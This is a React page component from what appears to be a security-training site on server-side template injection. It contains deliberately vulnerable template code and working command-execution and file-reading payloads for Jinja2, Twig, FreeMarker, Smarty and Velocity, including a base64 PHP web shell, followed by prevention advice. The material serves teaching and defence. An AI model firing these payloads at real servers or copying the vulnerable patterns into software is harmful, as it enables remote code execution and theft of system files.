
import React, { useState } from 'react';
import { Code2 } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';

const SSTI: React.FC = () => {
  const [selectedSection, setSelectedSection] = useState<string>('introduction');

  const attackSections = [
    { id: 'introduction', title: 'Introduction', icon: '📖' },
    { id: 'how-it-works', title: 'How SSTI Works', icon: '⚙️' },
    { id: 'vulnerable-components', title: 'Vulnerable Components', icon: '🎯' },
    { id: 'jinja2', title: 'Jinja2 (Python)', icon: '🐍' },
    { id: 'twig', title: 'Twig (PHP)', icon: '🐘' },
    { id: 'freemarker', title: 'FreeMarker (Java)', icon: '☕' },
    { id: 'smarty', title: 'Smarty (PHP)', icon: '🔧' },
    { id: 'velocity', title: 'Velocity (Java)', icon: '⚡' },
    { id: 'methodology', title: 'Detection Methodology', icon: '🔍' },
    { id: 'prevention', title: 'Prevention Strategies', icon: '🛡️' },
    { id: 'tools', title: 'Testing Tools', icon: '🔨' },
  ];

  return (
    <section id="ssti" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">
        Server-Side Template Injection (SSTI)
      </h3>
      
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
        {/* Left sidebar with attack types */}
        <div className="md:col-span-1">
          <div className="sticky top-20">
            <div className="bg-cybr-muted/20 rounded-lg p-4">
              <h4 className="text-lg font-semibold mb-4 text-cybr-primary">SSTI Topics</h4>
              
              <ScrollArea className="h-[calc(100vh-200px)] pr-4">
                <ul className="space-y-1">
                  {attackSections.map(section => (
                    <li key={section.id}>
                      <button 
                        className={`flex w-full items-center gap-2 p-2 rounded-md hover:bg-cybr-muted/30 transition-colors text-left ${selectedSection === section.id ? 'bg-cybr-muted/40 text-cybr-primary font-medium' : ''}`}
                        onClick={() => setSelectedSection(section.id)}
                      >
                        <span>{section.icon}</span>
                        <span className="text-sm">{section.title}</span>
                      </button>
                    </li>
                  ))}
                </ul>
              </ScrollArea>
            </div>
          </div>
        </div>
        
        {/* Right content area */}
        <div className="md:col-span-3">
          <div className="space-y-8">
            {/* Introduction */}
            {selectedSection === 'introduction' && (
              <div>
                <p className="mb-4">
                  Server-Side Template Injection (SSTI) occurs when an attacker is able to inject malicious input into a server-side 
                  template, causing the template engine to execute arbitrary code on the server. This vulnerability can lead to complete 
                  server compromise, as template engines often have access to sensitive functionality and can execute system commands. 
                  SSTI attacks are particularly dangerous because they often lead to Remote Code Execution (RCE).
                </p>
                
                <Alert className="mb-4 text-red-900 dark:text-red-200 bg-red-50 dark:bg-red-950/30">
                  <InfoIcon className="h-4 w-4" />
                  <AlertTitle>Critical Severity</AlertTitle>
                  <AlertDescription>
                    SSTI vulnerabilities frequently result in complete server compromise through Remote Code Execution. 
                    They can allow attackers to read sensitive files, execute system commands, and gain full control over the server.
                  </AlertDescription>
                </Alert>
              </div>
            )}

            {/* How SSTI Works */}
            {selectedSection === 'how-it-works' && (
              <div>
                <h4 className="text-xl font-semibold mb-4">How SSTI Attacks Work</h4>
                <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
                  <h5 className="font-semibold mb-2">Attack Flow:</h5>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li><strong>Template Identification:</strong> Attacker identifies that the application uses a template engine</li>
                    <li><strong>Injection Point Discovery:</strong> User input is being directly embedded into a template</li>
                    <li><strong>Template Engine Detection:</strong> Determine which template engine is being used</li>
                    <li><strong>Payload Crafting:</strong> Create engine-specific payloads to exploit template functionality</li>
                    <li><strong>Code Execution:</strong> Template engine processes the malicious input and executes arbitrary code</li>
                    <li><strong>System Compromise:</strong> Attacker gains control through command execution or file access</li>
                  </ol>
                </div>
              </div>
            )}

            {/* Vulnerable Components */}
            {selectedSection === 'vulnerable-components' && (
              <div>
                <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                  <SecurityCard
                    title="Web Framework Templates"
                    description="Applications using Flask/Jinja2, Django, Express/Handlebars, Ruby on Rails that embed user input directly into templates."
                    severity="high"
                  />
                  <SecurityCard
                    title="Email Template Systems"
                    description="Email services that allow customization of email templates with user-provided content without proper sanitization."
                    severity="high"
                  />
                  <SecurityCard
                    title="Report Generation"
                    description="Systems that generate reports or documents using template engines with user-controllable data."
                    severity="medium"
                  />
                  <SecurityCard
                    title="Content Management Systems"
                    description="CMS platforms that allow users to create custom templates or widgets with template engine functionality."
                    severity="medium"
                  />
                </div>
              </div>
            )}

            {/* Jinja2 Template Injection */}
            {selectedSection === 'jinja2' && (
              <div className="space-y-4">
                <h4 className="text-xl font-semibold mb-4">Jinja2 Template Injection (Flask/Python)</h4>
                <CodeExample 
                  language="python" 
                  isVulnerable={true}
                  title="Vulnerable Flask Application" 
                  code={`# Vulnerable Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    
    # Vulnerable: Direct string concatenation into template
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# Another vulnerable pattern
@app.route('/profile')
def profile():
    username = request.args.get('username')
    
    # Vulnerable: User input directly in template
    template = f"""
    <div class="profile">
        <h2>Welcome {username}</h2>
        <p>Your profile page</p>
    </div>
    """
    return render_template_string(template)`} 
                />
                
                <CodeExample 
                  language="python" 
                  title="Jinja2 SSTI Payloads" 
                  code={`# Basic detection payload
{{7*7}}  # Should output 49 if vulnerable

# Advanced detection
{{config}}  # Exposes Flask configuration

# Reading files
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Command execution payloads
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative command execution
{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh', shell=True, stdout=-1).communicate()[0].strip()}}

# Using request object
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Lipsum object exploitation
{{lipsum.__globals__['os'].popen('ls -la').read()}}

# Cycler object exploitation
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# More complex payload for newer versions
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}

# Using url_for
{{url_for.__globals__['sys'].modules['os'].popen('ls').read()}}`} 
                />
              </div>
            )}

            {/* Twig Template Injection */}
            {selectedSection === 'twig' && (
              <div className="space-y-4">
                <h4 className="text-xl font-semibold mb-4">Twig Template Injection (Symfony/PHP)</h4>
                <CodeExample 
                  language="php" 
                  isVulnerable={true}
                  title="Vulnerable Twig Usage" 
                  code={`<?php
// Vulnerable PHP application using Twig
use Twig\\Environment;
use Twig\\Loader\\ArrayLoader;

$loader = new ArrayLoader([]);
$twig = new Environment($loader);

$name = $_GET['name'] ?? 'World';

// Vulnerable: Direct user input in template
$template = $twig->createTemplate("Hello " . $name . "!");
echo $template->render();

// Another vulnerable pattern
$userTemplate = $_POST['template'] ?? 'Default content';
$template = $twig->createTemplate($userTemplate);
echo $template->render(['user' => $currentUser]);
?>`} 
                />
                
                <CodeExample 
                  language="twig" 
                  title="Twig SSTI Payloads" 
                  code={`{# Basic detection #}
{{7*7}}  {# Should output 49 #}

{# Access global functions #}
{{_self.env.getRuntime("Twig\\Runtime\\EscaperRuntime")}}

{# Command execution in older versions #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# File reading #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# Using dump function #}
{{dump(app)}}

{# Complex payload for command execution #}
{{['id']|filter('system')}}

{# Alternative command execution #}
{{['cat /etc/passwd']|map('system')|join}}

{# Using include with data protocol #}
{% include "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=" %}

{# Memory disclosure #}
{{_self.env.getGlobals()}}

{# Access to internal objects #}
{{_self.env.getLoader().getSourceContext('test').getCode()}}`} 
                />
              </div>
            )}

            {/* FreeMarker Template Injection */}
            {selectedSection === 'freemarker' && (
              <div className="space-y-4">
                <h4 className="text-xl font-semibold mb-4">FreeMarker Template Injection (Java)</h4>
                <CodeExample 
                  language="java" 
                  isVulnerable={true}
                  title="Vulnerable FreeMarker Usage" 
                  code={`// Vulnerable Java application using FreeMarker
Configuration cfg = new Configuration(Configuration.VERSION_2_3_29);
cfg.setDirectoryForTemplateLoading(new File("/templates"));

String userInput = request.getParameter("template");

// Vulnerable: Processing user input as template
Template template = new Template("userTemplate", userInput, cfg);
Writer output = new StringWriter();
template.process(dataModel, output);

return output.toString();`} 
                />
                
                <CodeExample 
                  language="freemarker" 
                  title="FreeMarker SSTI Payloads" 
                  code={`<#-- Basic detection -->
\${7*7}  <#-- Should output 49 -->

<#-- Command execution -->
<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }

<#-- File reading -->
<#assign classloader=thread.currentThread().contextClassLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("BEANS_WRAPPER").get(null)>
<#assign ec=dwf.unwrap(classloader.loadClass("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))>
\${ec.exec("cat /etc/passwd")}

<#-- Alternative command execution -->
\${"freemarker.template.utility.Execute"?new()("whoami")}

<#-- Using ObjectConstructor -->
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
\${oc("java.lang.ProcessBuilder","id").start()}

<#-- Reading system properties -->
<#assign system="java.lang.System"?new()>
\${system.getProperty("user.name")}

<#-- Memory access -->
<#assign thread=thread.currentThread()>
\${thread.getThreadGroup()}

<#-- Class loading and method invocation -->
<#assign classloader=thread.currentThread().contextClassLoader>
<#assign rt=classloader.loadClass("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null)>
<#assign process=rt.exec("ls -la")>
<#assign scanner=classloader.loadClass("java.util.Scanner").getConstructor(classloader.loadClass("java.io.InputStream")).newInstance(process.getInputStream())>
<#assign result=scanner.useDelimiter("\\A").next()>
\${result}`} 
                />
              </div>
            )}

            {/* Smarty Template Injection */}
            {selectedSection === 'smarty' && (
              <div className="space-y-4">
                <h4 className="text-xl font-semibold mb-4">Smarty Template Injection (PHP)</h4>
                <CodeExample 
                  language="php" 
                  isVulnerable={true}
                  title="Vulnerable Smarty Usage" 
                  code={`<?php
// Vulnerable PHP application using Smarty
require_once('libs/Smarty.class.php');

$smarty = new Smarty();
$userTemplate = $_POST['template'] ?? 'Default template';

// Vulnerable: Processing user input as template
$smarty->display('string:' . $userTemplate);

// Another vulnerable pattern
$name = $_GET['name'] ?? 'User';
$smarty->assign('name', $name);
$smarty->display('string:Hello {$name}!');
?>`} 
                />
                
                <CodeExample 
                  language="smarty" 
                  title="Smarty SSTI Payloads" 
                  code={`{* Basic detection *}
{7*7}  {* Should output 49 *}

{* Self-assignment for code execution *}
{assign var="cmd" value="id"}
{$smarty.template_object->display('string:{php}system($_GET.cmd);{/php}')}

{* Using static method calls *}
{php}system('whoami');{/php}

{* Command execution via eval *}
{assign var="name" value="hello"}
{$smarty.template_object->display("string:{assign var='x' value='system'}{$x('id')}")}

{* Reading files *}
{assign var="file" value="file_get_contents"}
{$file('/etc/passwd')}

{* Alternative approach *}
{assign var="exec" value="exec"}
{$exec('ls -la', $output)}
{$output}

{* Using Smarty modifiers *}
{$smarty.template_object->display('string:{assign var=cmd value="system"}{$cmd("cat /etc/passwd")}')}

{* Complex payload *}
{assign var="code" value="system"}
{assign var="payload" value="whoami"}
{$code($payload)}`} 
                />
              </div>
            )}

            {/* Velocity Template Injection */}
            {selectedSection === 'velocity' && (
              <div className="space-y-4">
                <h4 className="text-xl font-semibold mb-4">Velocity Template Injection (Java)</h4>
                <CodeExample 
                  language="java" 
                  isVulnerable={true}
                  title="Vulnerable Velocity Usage" 
                  code={`// Vulnerable Java application using Velocity
VelocityEngine velocityEngine = new VelocityEngine();
velocityEngine.init();

String userTemplate = request.getParameter("template");
VelocityContext context = new VelocityContext();

// Vulnerable: Processing user input as template
StringWriter writer = new StringWriter();
velocityEngine.evaluate(context, writer, "userTemplate", userTemplate);

return writer.toString();`} 
                />
                
                <CodeExample 
                  language="velocity" 
                  title="Velocity SSTI Payloads" 
                  code={`## Basic detection
#set($x=7*7)$x  ## Should output 49

## Command execution
#set($runtime = $rt.getRuntime())
#set($process = $runtime.exec("id"))
#set($null = $process.waitFor())
#set($inputstream = $process.getInputStream())
#set($inputstreamreader = $rt.getClass().forName("java.io.InputStreamReader").getConstructor($rt.getClass().forName("java.io.InputStream").getClass()).newInstance($inputstream))
#set($bufferedreader = $rt.getClass().forName("java.io.BufferedReader").getConstructor($rt.getClass().forName("java.io.Reader").getClass()).newInstance($inputstreamreader))
#set($line = "")
#set($stringbuilder = $rt.getClass().forName("java.lang.StringBuilder").newInstance())
#while($line = $bufferedreader.readLine())
  #set($null = $stringbuilder.append($line).append($rt.getClass().forName("java.lang.System").getField("lineSeparator").get($null)))
#end
$stringbuilder.toString()

## Alternative command execution
#set($runtime = $rt.getRuntime().exec("whoami"))

## Class loading
#set($class = $rt.getClass().forName("java.lang.Runtime"))
#set($method = $class.getMethod("getRuntime", null))
#set($runtime = $method.invoke(null, null))
#set($process = $runtime.exec("ls -la"))

## Reading system properties
#set($system = $rt.getClass().forName("java.lang.System"))
#set($props = $system.getMethod("getProperty", [$rt.getClass().forName("java.lang.String")]))
$props.invoke(null, ["user.name"])

## File operations
#set($file = $rt.getClass().forName("java.io.File").newInstance("/etc/passwd"))
#set($scanner = $rt.getClass().forName("java.util.Scanner").newInstance($file))
#set($content = $scanner.useDelimiter("\\A").next())
$content`} 
                />
              </div>
            )}

            {/* Detection and Exploitation Methodology */}
            {selectedSection === 'methodology' && (
              <div>
                <h4 className="text-xl font-semibold mb-4">SSTI Detection and Exploitation Methodology</h4>
                <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
                  <h5 className="font-semibold mb-2">Step-by-Step Exploitation:</h5>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li><strong>Identify Injection Points:</strong> Look for user input that gets reflected in responses</li>
                    <li><strong>Test for Template Processing:</strong> Use mathematical expressions like double curly braces with 7*7</li>
                    <li><strong>Determine Template Engine:</strong> Use engine-specific syntax to identify the backend</li>
                    <li><strong>Explore Template Context:</strong> Discover available objects and functions</li>
                    <li><strong>Escalate to Code Execution:</strong> Craft payloads for command execution</li>
                    <li><strong>Post-Exploitation:</strong> Maintain access and gather sensitive information</li>
                  </ol>
                </div>
              </div>
            )}

            {/* Prevention Strategies */}
            {selectedSection === 'prevention' && (
              <div>
                <h4 className="text-xl font-semibold mb-4">SSTI Prevention Strategies</h4>
                <CodeExample 
                  language="python" 
                  isVulnerable={false}
                  title="Secure Template Usage" 
                  code={`# Python Flask - Secure template usage
from flask import Flask, request, render_template
import re

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    
    # Secure: Use predefined template with variable substitution
    return render_template('hello.html', name=name)

# Input validation function
def validate_template_input(user_input):
    # Reject dangerous characters and patterns
    dangerous_patterns = [
        r'\\{\\{.*\\}\\}',  # Template expressions
        r'\\{%.*%\\}',    # Template statements
        r'__.*__',      # Python special methods
        r'\\..*\\(',      # Method calls
        r'import\\s+',   # Import statements
        r'exec\\s*\\(',   # Exec calls
        r'eval\\s*\\(',   # Eval calls
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            raise ValueError("Potentially malicious input detected")
    
    return user_input

# Safe template rendering with validation
@app.route('/profile')
def profile():
    username = request.args.get('username', '')
    
    # Validate input
    try:
        safe_username = validate_template_input(username)
    except ValueError:
        return "Invalid input", 400
    
    # Use template with validated data
    return render_template('profile.html', username=safe_username)

# Alternative: Use template sandboxing
from jinja2.sandbox import SandboxedEnvironment

# Create sandboxed environment
sandbox = SandboxedEnvironment()

# Custom template rendering with sandbox
def safe_render_template(template_string, **context):
    try:
        template = sandbox.from_string(template_string)
        return template.render(**context)
    except Exception as e:
        return f"Template error: {str(e)}"

# Content Security Policy header
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response`} 
                />
              </div>
            )}

            {/* Testing Tools */}
            {selectedSection === 'tools' && (
              <div>
                <h4 className="text-xl font-semibold mb-4">SSTI Testing Tools and Resources</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="p-4 bg-cybr-muted/50 rounded-md">
                    <h5 className="font-semibold mb-2">Automated Tools</h5>
                    <ul className="list-disc pl-6 space-y-1 text-sm">
                      <li><strong>Tplmap:</strong> Automated SSTI detection and exploitation tool</li>
                      <li><strong>Burp Suite:</strong> Manual and automated SSTI testing capabilities</li>
                      <li><strong>Nuclei:</strong> Template-based SSTI vulnerability detection</li>
                      <li><strong>SSTImap:</strong> Python tool for SSTI exploitation</li>
                    </ul>
                  </div>
                  
                  <div className="p-4 bg-cybr-muted/50 rounded-md">
                    <h5 className="font-semibold mb-2">Manual Testing Resources</h5>
                    <ul className="list-disc pl-6 space-y-1 text-sm">
                      <li><strong>PayloadsAllTheThings:</strong> Comprehensive SSTI payload collection</li>
                      <li><strong>HackTricks:</strong> SSTI methodology and techniques</li>
                      <li><strong>PortSwigger Research:</strong> Advanced SSTI exploitation techniques</li>
                      <li><strong>Custom Scripts:</strong> Engine-specific testing and exploitation</li>
                    </ul>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </section>
  );
};

export default SSTI;
